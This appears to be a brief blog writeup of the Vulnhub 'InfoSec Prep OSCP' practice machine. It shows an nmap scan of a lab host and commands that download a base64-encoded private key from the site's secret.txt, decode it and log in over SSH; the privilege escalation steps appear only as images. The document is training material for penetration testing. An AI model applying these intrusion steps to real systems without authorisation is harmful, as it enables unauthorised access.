---
layout: post
title: Vulnhub InfoSec Prep OSCP Writeup
---

# Vulnhub writeup

Start with a full nmap scan
```
nmap -A -p- -oA fullallport 192.168.0.15

Nmap scan report for 192.168.0.15
Host is up (0.00021s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry 
|_/secret.txt
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: OSCP Voucher &#8211; Just another WordPress site
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```
Discovered based64 encoded text on http://192.168.0.15/secret.txt which when decoded is a private key. On the website the user oscp is mentioned which we use to gain access via ssh.

```
wget -O secret.txt http://192.168.0.15/secret.txt
cat secret.txt | base64 -d > key.txt
chmod 600 key.txt
ssh -i key.txt oscp@192.168.0.15
```
Initial access

![ssh](/images/infosec1.png )

Linux Smart Enum scripts

![scripts](/images/infosec2.png )

Privilege Escalation

![esc](/images/infosec3.png )
